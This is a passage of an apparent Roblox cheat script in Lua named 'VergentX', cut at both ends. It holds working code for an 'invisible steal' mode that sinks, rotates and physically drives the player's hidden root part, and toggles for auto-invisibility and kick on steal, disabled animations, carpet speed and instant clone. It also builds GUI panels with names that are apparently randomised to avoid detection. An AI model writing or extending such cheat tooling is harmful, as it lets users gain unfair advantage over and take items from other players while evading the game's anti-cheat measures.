                    if _invisSFAtt then pcall(function() _invisSFAtt:Destroy() end) end
                    _invisSFAtt = Instance.new("Attachment")
                    _invisSFAtt.Name = "InvisLVAtt"
                    _invisSFAtt.Parent = oldRoot
                    _invisSF = Instance.new("LinearVelocity")
                    _invisSF.Name = "InvisSpeedForce"
                    _invisSF.Attachment0 = _invisSFAtt
                    _invisSF.RelativeTo = Enum.ActuatorRelativeTo.World
                    _invisSF.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
                    _invisSF.ForceLimitMode = Enum.ForceLimitMode.PerAxis
                    _invisSF.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                    _invisSF.Parent = oldRoot
                end
                local _yv = math.clamp(((root.Position.Y - sa) - oldRoot.Position.Y) * 25, -150, 150)
                local _vx = _rv.X + math.clamp((root.Position.X - oldRoot.Position.X) * 8, -15, 15)
                local _vz = _rv.Z + math.clamp((root.Position.Z - oldRoot.Position.Z) * 8, -15, 15)
                local _hv = Vector3.new(_vx, 0, _vz)
                if _hv.Magnitude > 65 then _hv = _hv.Unit * 65 end
                _invisSF.VectorVelocity = Vector3.new(_hv.X, _yv, _hv.Z)
                _invisSF.Enabled = true
                oldRoot.CFrame = CFrame.new(oldRoot.Position)
                    * root.CFrame.Rotation
                    * CFrame.Angles(math.rad(rotAngle), 0, 0)
                oldRoot.CanCollide = false
            else
                if _invisSF and _invisSF.Enabled then _invisSF.Enabled = false end
                local cf = root.CFrame - Vector3.new(0, sa, 0)
                oldRoot.CFrame = cf * CFrame.Angles(math.rad(rotAngle), 0, 0)
                oldRoot.AssemblyLinearVelocity = root.AssemblyLinearVelocity
                oldRoot.CanCollide = false
            end
            lastSetPosition = oldRoot.Position
        end)
        return true
    end

    local function toggle()
        if _G.VXInvisibleStealEnabled then invisTurnOff() else removeFolders(); invisTurnOn() end
    end

    _G.VXToggleInvisibleSteal = function()
        if (tick() - _invisToggleCooldown) < 0.3 then return end
        toggle()
    end
    _G.VXEnableV1SemiInvis = function() removeFolders(); invisTurnOn() end
    _G.VXDisableV1SemiInvis = invisTurnOff
    _G.VXSetInvisibleSteal = function(on)
        on = on and true or false
        if on and not _G.VXInvisibleStealEnabled then
            removeFolders(); invisTurnOn()
        elseif (not on) and _G.VXInvisibleStealEnabled then
            invisTurnOff()
        end
    end
    _G.VXStartInvisOnStealV1 = function()
        CONFIG.AUTO_INVIS = true
        _G.VXAutoInvisDuringSteal = true
    end
    _G.VXStopInvisOnStealV1 = function()
        CONFIG.AUTO_INVIS = false
        _G.VXAutoInvisDuringSteal = false
    end

    local function invisEngaged()
        return animPlaying == true
            and connection ~= nil
            and oldRoot ~= nil and oldRoot.Parent ~= nil
            and clone ~= nil and clone.Parent ~= nil
    end

    local function charReadyForInvis()
        local ch = LP.Character
        if not ch or ch.Parent == nil then return false end
        local hum = ch:FindFirstChildOfClass("Humanoid")
        local hrp = ch:FindFirstChild("HumanoidRootPart") or ch.PrimaryPart
        return (hum and hum.Health > 0 and hrp and hrp.Parent) and true or false
    end

    vxBind(LP:GetAttributeChangedSignal("Stealing"), function()
        if not LP:GetAttribute("Stealing") then clearInvisSuppress() end
    end)

    task.spawn(function()
        local streakStart, lastTry, failStreak = nil, 0, 0
        while vxAlive() do
            RunService.Heartbeat:Wait()
            pcall(function()
                if not CONFIG.AUTO_INVIS then
                    streakStart = nil
                    failStreak = 0
                    _autoInvisOwned = false
                    return
                end
                if LP:GetAttribute("Stealing") == true then
                    streakStart = streakStart or tick()
                    if invisEngaged() then
                        _autoInvisOwned = true
                        failStreak = 0
                        return
                    end
                    if autoInvisBlocked() then return end
                    if _G.VXRecoveryInProgress then return end
                    if (tick() - streakStart) < 0.3 then return end
                    local gap = (failStreak >= 4) and 0.5 or 0.12
                    if tick() - lastTry < gap then return end
                    lastTry = tick()
                    if animPlaying or _G.VXInvisibleStealEnabled then pcall(invisTurnOff) end
                    if charReadyForInvis() then
                        pcall(removeFolders)
                        local ok, res = pcall(invisTurnOn)
                        if ok and res == true and _G.VXInvisibleStealEnabled then
                            _autoInvisOwned = true
                            failStreak = 0
                        else
                            failStreak = failStreak + 1
                        end
                    end
                else
                    failStreak = 0
                    streakStart = nil
                    if (animPlaying or _G.VXInvisibleStealEnabled) and _autoInvisOwned then
                        pcall(invisTurnOff)
                    end
                    _autoInvisOwned = false
                end
            end)
        end
    end)

    _G.VX_autoRLast, _G.VX_autoRDir, _G.VX_autoRNext = 210, 1, 0
    vxBind(RunService.Heartbeat, function()
        _G.VXInvisActive = _G.VXInvisibleStealEnabled or false
        if not _G.VXAutoRotateInvis and _G.VXCurrentInvisRotation == nil then return end
        if _G.VXAutoRotateInvis then
            if _G.VXInvisibleStealEnabled == true then
                local now = tick()
                if now >= _G.VX_autoRNext then
                    _G.VX_autoRLast = _G.VX_autoRLast + _G.VX_autoRDir * 2
                    if _G.VX_autoRLast >= 225 then
                        _G.VX_autoRLast = 225; _G.VX_autoRDir = -1
                    elseif _G.VX_autoRLast <= 195 then
                        _G.VX_autoRLast = 195; _G.VX_autoRDir = 1
                    end
                    _G.VX_autoRLast = math.clamp(_G.VX_autoRLast, 180, 360)
                    _G.VX_autoRNext = now + 0.15
                end
                _G.VXCurrentInvisRotation = _G.VX_autoRLast
            else
                _G.VX_autoRLast, _G.VX_autoRDir, _G.VX_autoRNext = 210, 1, 0
                _G.VXCurrentInvisRotation = 210
            end
        else
            _G.VXCurrentInvisRotation = nil
        end
    end)

    vxBind(LP.CharacterAdded, function()
        task.wait(0.1)
        animPlaying = false
        _G.VXInvisibleStealEnabled = false
        clone, oldRoot, connection = nil, nil, nil
        clearAllGhosts()
    end)

    _G.VXInvisOnStealV1 = setmetatable({}, {
        __index = function(t, k)
            if k == "semiInvisEnabled" then return _G.VXInvisibleStealEnabled == true end
            if k == "ROTATION" then return _G.VXInvisStealAngle end
            if k == "autoRotateEnabled" then return _G.VXAutoRotateInvis == true end
            if k == "DEPTH" then return _G.VXSinkSliderValue end
            return rawget(t, k)
        end,
        __newindex = function(t, k, v)
            if k == "ROTATION" then _G.VXInvisStealAngle = v; return end
            if k == "autoRotateEnabled" then _G.VXAutoRotateInvis = v; return end
            if k == "DEPTH" then _G.VXSinkSliderValue = v; return end
            rawset(t, k, v)
        end,
    })

    F.setAutoInvis = function(on)
        CONFIG.AUTO_INVIS = on and true or false
        _G.VXAutoInvisDuringSteal = CONFIG.AUTO_INVIS
        if not CONFIG.AUTO_INVIS and _G.VXInvisibleStealEnabled and _autoInvisOwned then
            pcall(invisTurnOff)
            _autoInvisOwned = false
        end
        saveConfig()
    end

    F.setAutoRotateInvis = function(on)
        CONFIG.AUTO_ROTATE_INVIS = on and true or false
        _G.VXAutoRotateInvis = CONFIG.AUTO_ROTATE_INVIS
        saveConfig()
    end
end

local noAnimationActive = false
local noAnimHeartbeat = nil
local function setNoAnimation(enabled)
    enabled = enabled and true or false
    if enabled == noAnimationActive then return end
    noAnimationActive = enabled

    if enabled then
        if noAnimHeartbeat then noAnimHeartbeat:Disconnect() end
        noAnimHeartbeat = vxBind(RunService.Heartbeat, function()
            if not noAnimationActive then return end
            local char = LP.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            local animator = hum:FindFirstChild("Animator")
            if not animator then return end
            local invisTrack = _G.VXInvisAnimTrack
                or (_G.VXInvisOnStealV1 and _G.VXInvisOnStealV1.semiAnimTrack)
            local anchorTrack = _G.VXAnchorPoseTrack
            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                if track ~= invisTrack and track ~= anchorTrack then
                    pcall(function() track:Stop(0) end)
                end
            end
        end)
    else
        if noAnimHeartbeat then
            noAnimHeartbeat:Disconnect()
            noAnimHeartbeat = nil
        end
    end
end
F.setNoAnimation = function(on)
    CONFIG.NO_ANIM = on and true or false
    setNoAnimation(CONFIG.NO_ANIM)
    saveConfig()
end

local ControlPanel = { gui = nil }

local VX_ROT_MIN, VX_ROT_MAX = 180, 360
local VX_DEPTH_MIN, VX_DEPTH_MAX = 5, 10

local function CreateControlPanel()
    local gui = Instance.new("ScreenGui")
    gui.Name = _vxName("VergentXCtrlPanel")
    gui.DisplayOrder = 50000
    gui.ResetOnSpawn = false
    gui.Enabled = CONFIG.CTRL_PANEL == true
    mountGui(gui)
    ControlPanel.gui = gui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 280 * MOBILE_SCALE, 0, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    _vxApplySavedPos(mainFrame, "CTRL_POS", 0.5, 0.5)
    mainFrame.BackgroundColor3 = Theme.Background
    mainFrame.BackgroundTransparency = 0.08
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = gui
    applyMarble(mainFrame, true)

    local cpScale = Instance.new("UIScale", mainFrame)
    VergentXRegisterScale(cpScale, 1)

    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)
    complexBG(mainFrame, { corner = 12 * MOBILE_SCALE, border = false })

    local borderStroke = Instance.new("UIStroke", mainFrame)
    borderStroke.Thickness = 0.8
    borderStroke.Transparency = 0.25
    borderStroke.Color = Color3.fromRGB(6, 6, 8)
    borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(borderStroke, RING_SEQ, 25)

    local header = Instance.new("Frame", mainFrame)
    header.Size = UDim2.new(1, 0, 0, 40 * MOBILE_SCALE)
    header.BackgroundTransparency = 1
    header.Active = true
    MakeDraggable(header, mainFrame, "CTRL_POS")

    local strip = Instance.new("Frame", header)
    strip.Size = UDim2.new(1, 0, 0, 33 * MOBILE_SCALE)
    strip.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    strip.BackgroundTransparency = 0.45
    strip.BorderSizePixel = 0
    Instance.new("UICorner", strip).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)

    local title = Instance.new("TextLabel", strip)
    title.Size = UDim2.new(1, -28 * MOBILE_SCALE, 1, 0)
    title.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, 0)
    title.BackgroundTransparency = 1
    title.ZIndex = 2
    title.Text = "Control Panel"
    title.Font = Enum.Font.Gotham
    title.TextSize = 16 * MOBILE_SCALE
    title.TextColor3 = Theme.TextPrimary
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 1
    VergentXTitleGrad(title)

    local content = Instance.new("Frame", mainFrame)
    content.Size = UDim2.new(1, -20 * MOBILE_SCALE, 0, 0)
    content.AutomaticSize = Enum.AutomaticSize.Y
    content.Position = UDim2.new(0, 10 * MOBILE_SCALE, 0, 44 * MOBILE_SCALE)
    content.BackgroundTransparency = 1

    local layout = Instance.new("UIListLayout", content)
    layout.Padding = UDim.new(0, 6 * MOBILE_SCALE)
    layout.SortOrder = Enum.SortOrder.LayoutOrder

    local function resizeToContent()
        local f = (cpScale.Scale > 0) and cpScale.Scale or 1
        mainFrame.Size = UDim2.new(0, 280 * MOBILE_SCALE,
            0, (layout.AbsoluteContentSize.Y / f) + 58 * MOBILE_SCALE)
    end
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(resizeToContent)
    task.defer(resizeToContent)

    local ON_COL  = Color3.fromRGB(188, 150, 62)
    local OFF_COL = Color3.fromRGB(44, 45, 51)

    local function cpToggleRow(text, startOn, callback)
        local row = Instance.new("Frame", content)
        row.Size = UDim2.new(1, 0, 0, 34 * MOBILE_SCALE)
        row.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
        row.BackgroundTransparency = 0.32
        row.BorderSizePixel = 0
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6 * MOBILE_SCALE)
        local st = Instance.new("UIStroke", row)
        st.Color = Color3.fromRGB(6, 6, 8)
        st.Thickness = 1
        st.Transparency = 0.85
        st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.6, -8 * MOBILE_SCALE, 1, 0)
        lbl.Position = UDim2.new(0, 10 * MOBILE_SCALE, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 12 * MOBILE_SCALE
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local isOn = startOn and true or false
        local tFrame = Instance.new("Frame", row)
        tFrame.Size = UDim2.new(0, 44 * MOBILE_SCALE, 0, 22 * MOBILE_SCALE)
        tFrame.Position = UDim2.new(1, -52 * MOBILE_SCALE, 0.5, -11 * MOBILE_SCALE)
        tFrame.BackgroundColor3 = isOn and ON_COL or OFF_COL
        tFrame.BorderSizePixel = 0
        Instance.new("UICorner", tFrame).CornerRadius = UDim.new(1, 0)

        local dot = Instance.new("Frame", tFrame)
        dot.Size = UDim2.new(0, 18 * MOBILE_SCALE, 0, 18 * MOBILE_SCALE)
        dot.Position = isOn and UDim2.new(1, -20 * MOBILE_SCALE, 0.5, -9 * MOBILE_SCALE)
            or UDim2.new(0, 2 * MOBILE_SCALE, 0.5, -9 * MOBILE_SCALE)
        dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        dot.BorderSizePixel = 0
        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

        local btn = Instance.new("TextButton", tFrame)
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.BackgroundTransparency = 1
        btn.Text = ""

        local function paint()
            local p = isOn and UDim2.new(1, -20 * MOBILE_SCALE, 0.5, -9 * MOBILE_SCALE)
                or UDim2.new(0, 2 * MOBILE_SCALE, 0.5, -9 * MOBILE_SCALE)
            TweenService:Create(dot, TweenInfo.new(0.2), { Position = p }):Play()
            TweenService:Create(tFrame, TweenInfo.new(0.2),
                { BackgroundColor3 = isOn and ON_COL or OFF_COL }):Play()
        end

        btn.MouseButton1Click:Connect(function()
            isOn = not isOn
            paint()
            if callback then callback(isOn) end
            pcall(ShowNotification, text, isOn and "Enabled" or "Disabled")
        end)

        return function(v)
            isOn = v and true or false
            paint()
        end
    end

    local function cpSlider(labelText, mn, mx, startVal, step, onChange)
        local row = Instance.new("Frame", content)
        row.Size = UDim2.new(1, 0, 0, 48 * MOBILE_SCALE)
        row.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
        row.BackgroundTransparency = 0.32
        row.BorderSizePixel = 0
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 6 * MOBILE_SCALE)
        local st = Instance.new("UIStroke", row)
        st.Color = Color3.fromRGB(6, 6, 8)
        st.Thickness = 1
        st.Transparency = 0.85
        st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local span = mx - mn
        step = tonumber(step) or 1
        local decimals = (step < 1) and 1 or 0

        local function quant(v)
            v = math.clamp(tonumber(v) or mn, mn, mx)
            v = math.floor(v / step + 0.5) * step
            v = math.floor(v * 1000 + 0.5) / 1000
            return math.clamp(v, mn, mx)
        end
        local function fmt(v)
            if decimals > 0 then return string.format("%." .. decimals .. "f", v) end
            return tostring(math.floor(v + 0.5))
        end

        local val = quant(startVal)

        local lbl = Instance.new("TextLabel", row)
        lbl.Size = UDim2.new(0.6, 0, 0, 20 * MOBILE_SCALE)
        lbl.Position = UDim2.new(0, 8 * MOBILE_SCALE, 0, 3 * MOBILE_SCALE)
        lbl.BackgroundTransparency = 1
        lbl.Text = labelText .. ": " .. fmt(val)
        lbl.Font = Enum.Font.Gotham
        lbl.TextSize = 12 * MOBILE_SCALE
        lbl.TextColor3 = Theme.TextPrimary
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.TextStrokeTransparency = 1

        local valLbl = Instance.new("TextLabel", row)
        valLbl.Size = UDim2.new(0, 50 * MOBILE_SCALE, 0, 20 * MOBILE_SCALE)
        valLbl.Position = UDim2.new(1, -60 * MOBILE_SCALE, 0, 3 * MOBILE_SCALE)
        valLbl.BackgroundTransparency = 1
        valLbl.Text = fmt(val)
        valLbl.Font = Enum.Font.Gotham
        valLbl.TextSize = 12 * MOBILE_SCALE
        valLbl.TextColor3 = Color3.fromRGB(204, 164, 72)
        valLbl.TextXAlignment = Enum.TextXAlignment.Right
        valLbl.TextStrokeTransparency = 1

        local bg = Instance.new("Frame", row)
        bg.Size = UDim2.new(1, -16 * MOBILE_SCALE, 0, 4 * MOBILE_SCALE)
        bg.Position = UDim2.new(0, 8 * MOBILE_SCALE, 0, 33 * MOBILE_SCALE)
        bg.BackgroundColor3 = Color3.fromRGB(29, 30, 33)
        bg.BorderSizePixel = 0
        Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)

        local pct0 = (span > 0) and math.clamp((val - mn) / span, 0, 1) or 0
        local fill = Instance.new("Frame", bg)
        fill.Size = UDim2.new(pct0, 0, 1, 0)
        fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        fill.BorderSizePixel = 0
        Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
        gradient(fill, ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 118, 48)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(204, 164, 72)),
        }), 0)

        local knob = Instance.new("Frame", bg)
        knob.Size = UDim2.new(0, 20 * MOBILE_SCALE, 0, 9 * MOBILE_SCALE)
        knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        knob.BorderSizePixel = 0
        knob.AnchorPoint = Vector2.new(pct0, 0.5)
        knob.Position = UDim2.new(pct0, 0, 0.5, 0)
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
        local ks = Instance.new("UIStroke", knob)
        ks.Color = Color3.fromRGB(204, 164, 72)
        ks.Thickness = 1
        ks.Transparency = 0.15
        ks.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local dragging = false
        local function applyX(x)
            local p = bg.AbsolutePosition.X
            local s = bg.AbsoluteSize.X
            if s <= 0 then return end
            local pct = math.clamp((x - p) / s, 0, 1)
            val = quant(mn + pct * span)
            local snap = (span > 0) and math.clamp((val - mn) / span, 0, 1) or 0
            fill.Size = UDim2.new(snap, 0, 1, 0)
            knob.AnchorPoint = Vector2.new(snap, 0.5)
            knob.Position = UDim2.new(snap, 0, 0.5, 0)
            lbl.Text = labelText .. ": " .. fmt(val)
            valLbl.Text = fmt(val)
            if onChange then onChange(val) end
        end

        local hitPad = Instance.new("TextButton", row)
        hitPad.Name = "VergentX_SliderTouch"
        hitPad.Position = UDim2.new(0, 4 * MOBILE_SCALE, 0, 23 * MOBILE_SCALE)
        hitPad.Size = UDim2.new(1, -8 * MOBILE_SCALE, 0, 24 * MOBILE_SCALE)
        hitPad.BackgroundTransparency = 1
        hitPad.Text = ""
        hitPad.AutoButtonColor = false
        hitPad.ZIndex = 3
        hitPad.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                applyX(input.Position.X)
            end
        end)

        bg.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                applyX(input.Position.X)
            end
        end)
        knob.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
            end
        end)
        vxBind(UserInputService.InputEnded, function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
        vxBind(UserInputService.InputChanged, function(input)
            if not dragging then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch then
                applyX(input.Position.X)
            end
        end)

        return function(v)
            val = quant(v)
            local pct = (span > 0) and math.clamp((val - mn) / span, 0, 1) or 0
            fill.Size = UDim2.new(pct, 0, 1, 0)
            knob.AnchorPoint = Vector2.new(pct, 0.5)
            knob.Position = UDim2.new(pct, 0, 0.5, 0)
            lbl.Text = labelText .. ": " .. fmt(val)
            valLbl.Text = fmt(val)
        end
    end

    local cpKickVisual = cpToggleRow("Kick on Steal", CONFIG.AUTO_KICK, function(on)
        F.setAutoKick(on)
    end)
    _G.VXKickVisuals[#_G.VXKickVisuals + 1] = cpKickVisual

    cpToggleRow("Auto Invis on Steal", CONFIG.AUTO_INVIS, function(on)
        F.setAutoInvis(on)
    end)

    cpToggleRow("Auto Rotate Invis", CONFIG.AUTO_ROTATE_INVIS, function(on)
        F.setAutoRotateInvis(on)
    end)

    cpToggleRow("No Animation", CONFIG.NO_ANIM, function(on)
        F.setNoAnimation(on)
    end)

    ControlPanel.setRotation = cpSlider("Invis Rotation", VX_ROT_MIN, VX_ROT_MAX,
        CONFIG.INVIS_ANGLE or 180, 1, function(v)
            CONFIG.INVIS_ANGLE = v
            _G.VXInvisStealAngle = v
            if _G.VXInvisOnStealV1 then _G.VXInvisOnStealV1.ROTATION = v end
            saveConfig()
        end)

    ControlPanel.setDepth = cpSlider("Invis Depth", VX_DEPTH_MIN, VX_DEPTH_MAX,
        CONFIG.INVIS_DEPTH or 8, 0.1, function(v)
            CONFIG.INVIS_DEPTH = v
            _G.VXSinkSliderValue = v
            if _G.VXInvisOnStealV1 then _G.VXInvisOnStealV1.DEPTH = v end
            saveConfig()
        end)

    local pad = Instance.new("Frame", content)
    pad.Name = "VergentX_BottomPad"
    pad.Size = UDim2.new(1, 0, 0, 6 * MOBILE_SCALE)
    pad.BackgroundTransparency = 1

    vxAttachReveal(gui, mainFrame)

    function ControlPanel.SetPosition(pos)
        if pos then mainFrame.Position = pos end
    end
    _G.VXControlPanel = ControlPanel

    _G.VXInvisStealAngle = CONFIG.INVIS_ANGLE or 180
    _G.VXSinkSliderValue = CONFIG.INVIS_DEPTH or 8
end

F.setControlPanel = function(on)
    CONFIG.CTRL_PANEL = on and true or false
    if ControlPanel.gui then ControlPanel.gui.Enabled = CONFIG.CTRL_PANEL end
    saveConfig()
end

local ActionsPanel = { gui = nil }

local ACTION_DEFS = {
    { "Carpet Speed",  "CarpetSpeed" },
    { "Instant Clone", "InstantClone" },
    { "Instant Reset", "InstantReset" },
    { "Rejoin Server", "Rejoin" },
}

local function CreateActionsPanel()
    local gui = Instance.new("ScreenGui")
    gui.Name = _vxName("VergentXActionsPanel")
    gui.DisplayOrder = 50000
    gui.ResetOnSpawn = false
    gui.Enabled = CONFIG.ACTIONS_PANEL == true
    mountGui(gui)
    ActionsPanel.gui = gui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 252 * MOBILE_SCALE, 0, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    _vxApplySavedPos(mainFrame, "ACT_POS", 0.5, 0.5)
    mainFrame.BackgroundColor3 = Theme.Background
    mainFrame.BackgroundTransparency = 0.08
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = gui
    applyMarble(mainFrame, true)

    local apScale = Instance.new("UIScale", mainFrame)
    VergentXRegisterScale(apScale, 1)

    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)
    complexBG(mainFrame, { corner = 12 * MOBILE_SCALE, border = false })

    local borderStroke = Instance.new("UIStroke", mainFrame)
    borderStroke.Thickness = 0.8
    borderStroke.Transparency = 0.25
    borderStroke.Color = Color3.fromRGB(6, 6, 8)
    borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(borderStroke, RING_SEQ, 25)

    local header = Instance.new("Frame", mainFrame)
    header.Size = UDim2.new(1, 0, 0, 40 * MOBILE_SCALE)
    header.BackgroundTransparency = 1
    header.Active = true
    MakeDraggable(header, mainFrame, "ACT_POS")

    local strip = Instance.new("Frame", header)
    strip.Size = UDim2.new(1, 0, 0, 33 * MOBILE_SCALE)
    strip.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    strip.BackgroundTransparency = 0.45
    strip.BorderSizePixel = 0
    Instance.new("UICorner", strip).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)

    local title = Instance.new("TextLabel", strip)
    title.Size = UDim2.new(1, -28 * MOBILE_SCALE, 1, 0)
    title.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, 0)
    title.BackgroundTransparency = 1
    title.ZIndex = 2
    title.Text = "Actions Panel"
    title.Font = Enum.Font.Gotham
    title.TextSize = 16 * MOBILE_SCALE
    title.TextColor3 = Theme.TextPrimary
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 1
    VergentXTitleGrad(title)

    local content = Instance.new("Frame", mainFrame)
    content.Size = UDim2.new(1, -20 * MOBILE_SCALE, 0, 0)
    content.AutomaticSize = Enum.AutomaticSize.Y
    content.Position = UDim2.new(0, 10 * MOBILE_SCALE, 0, 44 * MOBILE_SCALE)
    content.BackgroundTransparency = 1

    local layout = Instance.new("UIListLayout", content)
    layout.Padding = UDim.new(0, 6 * MOBILE_SCALE)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

    local function resizeToContent()
        local f = (apScale.Scale > 0) and apScale.Scale or 1
        mainFrame.Size = UDim2.new(0, 252 * MOBILE_SCALE,
            0, (layout.AbsoluteContentSize.Y / f) + 58 * MOBILE_SCALE)
    end
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(resizeToContent)
    task.defer(resizeToContent)

    local function actionButton(text, actionKey, order)
        local btn = Instance.new("TextButton", content)
        btn.Size = UDim2.new(1, 0, 0, 34 * MOBILE_SCALE)
        btn.LayoutOrder = order
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 19)
        btn.BackgroundTransparency = 0.32
        btn.AutoButtonColor = false
        btn.BorderSizePixel = 0
        btn.Text = text
        btn.Font = Enum.Font.Gotham
        btn.TextSize = 12 * MOBILE_SCALE
        btn.TextColor3 = Color3.fromRGB(224, 225, 229)
        btn.TextStrokeTransparency = 1
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8 * MOBILE_SCALE)

        local hollow = Instance.new("UIStroke", btn)
        hollow.Color = Color3.fromRGB(6, 6, 8)
        hollow.Thickness = 0.5
        hollow.Transparency = 0.5
        hollow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.55 }):Play()
            TweenService:Create(hollow, TweenInfo.new(0.18), { Transparency = 0.2 }):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.18), { BackgroundTransparency = 0.32 }):Play()
            TweenService:Create(hollow, TweenInfo.new(0.18), { Transparency = 0.5 }):Play()
        end)

        btn.MouseButton1Click:Connect(function()
            TweenService:Create(hollow, TweenInfo.new(0.1), { Color = Theme.Success }):Play()
            task.delay(0.2, function()
                if hollow and hollow.Parent then
                    TweenService:Create(hollow, TweenInfo.new(0.15),
                        { Color = Color3.fromRGB(6, 6, 8) }):Play()
                end
            end)
            local fn = KEY_ACTIONS[actionKey]
            if fn then task.spawn(function() pcall(fn) end) end
        end)
        return btn
    end

    for i, def in ipairs(ACTION_DEFS) do
        actionButton(def[1], def[2], i)
    end

    local pad = Instance.new("Frame", content)
    pad.Name = "VergentX_BottomPad"
    pad.LayoutOrder = #ACTION_DEFS + 1
    pad.Size = UDim2.new(1, 0, 0, 2 * MOBILE_SCALE)
    pad.BackgroundTransparency = 1

    function ActionsPanel.SetVisible(on)
        gui.Enabled = on and true or false
    end
    function ActionsPanel.SetPosition(pos)
        if pos then mainFrame.Position = pos end
    end
    vxAttachReveal(gui, mainFrame)

    _G.VXActionsPanel = ActionsPanel
    return ActionsPanel
end

F.setActionsPanel = function(on)
    CONFIG.ACTIONS_PANEL = on and true or false
    if ActionsPanel.gui then ActionsPanel.gui.Enabled = CONFIG.ACTIONS_PANEL end
    saveConfig()
end

local Launcher = { gui = nil }

local function CreateLauncher()
    local LB = 56
    local LOGO_ASSET = "rbxassetid://71890554393609"

    local gui = Instance.new("ScreenGui")
    gui.Name = _vxName("VergentXLauncher")
    gui.DisplayOrder = 50002
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Enabled = true
    mountGui(gui)
    Launcher.gui = gui

    local holder = Instance.new("Frame", gui)
    holder.Name = "VergentX_LauncherHolder"
    holder.Size = UDim2.new(0, LB, 0, LB)
    holder.AnchorPoint = Vector2.new(0.5, 0.5)
    _vxApplySavedPos(holder, "LAUNCH_POS", 0.5, 0.5)
    holder.BackgroundTransparency = 1
    holder.Active = true

    local scale = Instance.new("UIScale", holder)
    VergentXRegisterScale(scale, 1)
    local function restScale()
        return 1 * (VXLiveScale or 1)
    end

    local fadeParts = {}
    local function fadePart(inst, prop, rest)
        fadeParts[#fadeParts + 1] = { inst, prop, rest }
        return inst
    end

    local function discFrame(parent, pad, zi)
        local d = Instance.new("Frame", parent)
        d.AnchorPoint = Vector2.new(0.5, 0.5)
        d.Position = UDim2.new(0.5, 0, 0.5, 0)
        d.Size = UDim2.new(1, pad, 1, pad)
        d.BackgroundTransparency = 1
        d.BorderSizePixel = 0
        d.ZIndex = zi or 1
        Instance.new("UICorner", d).CornerRadius = UDim.new(1, 0)
        return d
    end

    local shadow = discFrame(holder, 10, 0)
    shadow.Name = "VergentX_LauncherShadow"
    shadow.Position = UDim2.new(0.5, 0, 0.5, 3)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.55
    gradient(shadow, nil, 90, NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 1.00),
        NumberSequenceKeypoint.new(0.45, 0.80),
